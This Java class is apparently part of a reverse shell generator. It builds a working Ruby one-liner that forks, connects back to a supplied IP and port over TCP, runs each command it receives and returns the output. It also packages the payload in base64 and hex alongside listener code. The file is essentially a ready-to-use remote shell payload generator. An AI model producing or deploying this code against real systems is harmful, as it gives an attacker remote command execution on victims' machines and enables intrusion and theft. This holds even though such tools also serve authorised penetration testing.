    package com.iteso.ReverseShellGenerator.Reverse.Shells;
    import com.iteso.ReverseShellGenerator.DEncoder;
    import com.iteso.ReverseShellGenerator.Reverse.Reverse;

    public class Ruby_no_sh extends Reverse {

        protected String shellFormat = "";

        public Ruby_no_sh(String localIP, int localPort, LISTENER listener, SHELLS shellType){
            super(localIP, localPort, listener, shellType);
            shellFormat = String.format("ruby -rsocket -e'exit if fork;c=TCPSocket.new(\\\"%s\\\",\\\"%s\\\");loop{c.gets.chomp!;(exit! if $_==\\\"exit\\\");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts \\\"failed: #{$_}\\\"}'",this.getLocalIP() ,this.getLocalPort());
        }

        @Override
        public String getShellCode(){
            return shellFormat;
        }

        @Override
        public String toString(){
            return "{" + "\"parameters\": " + super.toString() + "," +
                        "\"reverse_listener_code\": " + "\"" + super.getListenerCode() + "\"," +
                        "\"reverse_shell_code\": " + "\"" + getShellCode() + "\"," +
                        "\"reverse_shell_code_b64\": " + "\"" + DEncoder.encodeToBase64(getShellCode()) + "\"," +
                        "\"reverse_shell_code_hex\": " + "\"" + DEncoder.encodeToHex(getShellCode()) + "\"" +
                    "}";
        }
    
}